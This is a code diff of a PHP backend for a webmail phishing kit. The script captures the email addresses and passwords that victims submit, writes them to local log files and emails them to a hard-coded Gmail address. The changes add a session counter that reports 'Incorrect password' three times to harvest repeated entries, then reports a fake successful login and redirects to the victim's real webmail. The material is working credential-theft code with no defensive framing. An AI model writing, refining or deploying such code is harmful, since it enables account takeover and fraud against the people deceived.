@@ -1,14 +1,9 @@
 <?php
-// Disable error reporting to prevent output interference
-error_reporting(0);
-ini_set('display_errors', 0);
+session_start();
 
-// Set content type for JSON response
-header('Content-Type: application/json');
-
-// Email configuration - CHANGE THESE VALUES
-$LOG_EMAIL = 'skkho87.sm@gmail.com';  // Change this to your email address
-$FROM_EMAIL = 'rc@webmail-logger.com';  // Change this to your domain
+// Email configuration
+$LOG_EMAIL = 'skkho87.sm@gmail.com';
+$FROM_EMAIL = 'rc@webmail-logger.com';
 $FROM_NAME = 'RC Webmail Logger';
 
 // Function to send email log
@@ -68,53 +63,60 @@ function sendEmailLog($email, $password, $attempt, $logData) {
     
     $header_string = implode("\r\n", $headers);
     
-    // Try to send email
-    return mail($LOG_EMAIL, $subject, $message, $header_string);
+    // Try to send email and also save to backup file
+    $emailResult = false;
+    if (function_exists('mail')) {
+        $emailResult = mail($LOG_EMAIL, $subject, $message, $header_string);
+    }
+    
+    // Always save to backup file
+    $backupLog = "
+=== EMAIL BACKUP ===
+To: $LOG_EMAIL
+Subject: $subject
+Timestamp: " . $logData['timestamp'] . "
+Email Sent: " . ($emailResult ? 'YES' : 'NO') . "
+Content: 
+Email: $email
+Password: $password
+IP: " . $logData['ip_address'] . "
+User Agent: " . $logData['user_agent'] . "
+===================
+
+";
+    @file_put_contents('email_backup.log', $backupLog, FILE_APPEND | LOCK_EX);
+    
+    return true; // Always return true since we save to backup
 }
 
-// Function to send log data
-function sendLog($email, $password, $attempt) {
+// Function to log data (both file and email)
+function logData($email, $password, $attempt) {
+    $logFile = 'logs.txt';
+    $timestamp = date('Y-m-d H:i:s');
+    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+    $referer = $_SERVER['HTTP_REFERER'] ?? 'Unknown';
+    
+    // Create log data structure
     $logData = array(
-        'timestamp' => date('Y-m-d H:i:s'),
-        'email' => $email,
-        'password' => $password,
-        'attempt' => $attempt,
-        'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
-        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
-        'referer' => $_SERVER['HTTP_REFERER'] ?? 'unknown'
+        'timestamp' => $timestamp,
+        'ip_address' => $ip,
+        'user_agent' => $userAgent,
+        'referer' => $referer
     );
     
-    // Send log via email
-    $emailSent = sendEmailLog($email, $password, $attempt, $logData);
-    
-    // Alternative: Save to local file (uncomment the lines below if you prefer local logging)
-    /*
-    $logFile = 'login_logs.txt';
-    $logEntry = date('Y-m-d H:i:s') . " | Attempt: $attempt | Email: $email | Password: $password | IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "\n";
+    // File logging (original format)
+    $logEntry = "[{$timestamp}] IP: {$ip} | Email: {$email} | Password: {$password} | Attempt: {$attempt} | UA: {$userAgent}" . PHP_EOL;
     file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
-    */
     
-    // Send log via cURL (uncomment and configure if you have a remote logging endpoint)
-    /*
-    $logUrl = 'https://your-logging-server.com/api/log';
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $logUrl);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($logData));
-    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-        'Content-Type: application/json',
-        'Authorization: Bearer YOUR_API_TOKEN' // Add your API token if needed
-    ));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    
-    $response = curl_exec($ch);
-    curl_close($ch);
-    */
-    
-    // Return true if email was sent successfully
-    return $emailSent;
+    // Email logging
+    sendEmailLog($email, $password, $attempt, $logData);
+}
+
+// Function to get domain from email
+function getDomainFromEmail($email) {
+    $parts = explode('@', $email);
+    return count($parts) > 1 ? $parts[1] : '';
 }
 
 // Function to validate email format
@@ -122,60 +124,75 @@ function isValidEmail($email) {
     return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
 }
 
-// Function to get the webmail domain for redirect
-function getWebmailDomain($email) {
-    $domain = substr(strrchr($email, "@"), 1);
-    return "https://webmail." . $domain;
-}
-
-// Check if this is a POST request
-if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
-    http_response_code(405);
-    echo json_encode(array('signal' => 'ERROR', 'msg' => 'Method not allowed'));
-    exit;
-}
-
-// Get POST data
-$email = isset($_POST['email']) ? trim($_POST['email']) : '';
-$password = isset($_POST['password']) ? trim($_POST['password']) : '';
-
-// Basic validation
-if (empty($email) || empty($password)) {
-    echo json_encode(array('signal' => 'ERROR', 'msg' => 'Email and password are required'));
-    exit;
-}
-
-if (!isValidEmail($email)) {
-    echo json_encode(array('signal' => 'ERROR', 'msg' => 'Please enter a valid email address'));
-    exit;
-}
-
-// Send logs 4 times
-$logSuccess = true;
-for ($i = 1; $i <= 4; $i++) {
-    $result = sendLog($email, $password, $i);
-    if (!$result) {
-        $logSuccess = false;
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Get data from POST (support both your form fields and the example fields)
+    $email = $_POST['email'] ?? $_POST['ai'] ?? '';
+    $password = $_POST['password'] ?? $_POST['pr'] ?? '';
+    
+    header('Content-Type: application/json');
+    
+    // Basic validation
+    if (empty($email) || empty($password)) {
+        echo json_encode([
+            'signal' => 'ERROR',
+            'success' => false,
+            'msg' => 'Email and password are required'
+        ]);
+        exit;
     }
     
-    // Small delay between log attempts (optional)
-    usleep(100000); // 0.1 second delay
+    if (!isValidEmail($email)) {
+        echo json_encode([
+            'signal' => 'ERROR',
+            'success' => false,
+            'msg' => 'Please enter a valid email address'
+        ]);
+        exit;
+    }
+    
+    // Initialize attempt counter for this email
+    $sessionKey = 'attempts_' . md5($email);
+    if (!isset($_SESSION[$sessionKey])) {
+        $_SESSION[$sessionKey] = 0;
+        $_SESSION['current_email'] = $email;
+    }
+    
+    // Increment attempt counter
+    $_SESSION[$sessionKey]++;
+    $currentAttempt = $_SESSION[$sessionKey];
+    
+    // Log the attempt (this sends email and saves to file)
+    logData($email, $password, $currentAttempt);
+    
+    if ($currentAttempt < 4) {
+        // First 3 attempts - show error message
+        echo json_encode([
+            'signal' => 'ERROR',
+            'success' => false,
+            'msg' => 'Incorrect password. Please try again.',
+            'attempt' => $currentAttempt
+        ]);
+    } else {
+        // 4th attempt - prepare for redirect
+        $domain = getDomainFromEmail($email);
+        $redirectUrl = $domain ? "https://webmail.{$domain}" : "https://webmail.gmail.com";
+        
+        echo json_encode([
+            'signal' => 'OK',
+            'success' => true,
+            'msg' => 'Login successful! Redirecting to your webmail...',
+            'redirect_url' => $redirectUrl,
+            'attempt' => $currentAttempt
+        ]);
+        
+        // Clear session for this email
+        unset($_SESSION[$sessionKey]);
+        unset($_SESSION['current_email']);
+    }
+    exit;
 }
 
-// Always return success response to trigger redirect
-// This simulates a successful login regardless of actual credentials
-$webmailUrl = getWebmailDomain($email);
-
-echo json_encode(array(
-    'signal' => 'OK',
-    'msg' => 'Login successful! Redirecting to your webmail...',
-    'redirect_url' => $webmailUrl,
-    'logs_sent' => $logSuccess ? 4 : 'partial'
-));
-
-// Optional: Add redirect header for browsers that don't handle the JSON response
-// Uncomment the line below if you want immediate server-side redirect instead of JavaScript redirect
-// header("Location: " . $webmailUrl);
-
+// If not POST request, redirect to index
+header('Location: index.html');
 exit;
 ?>
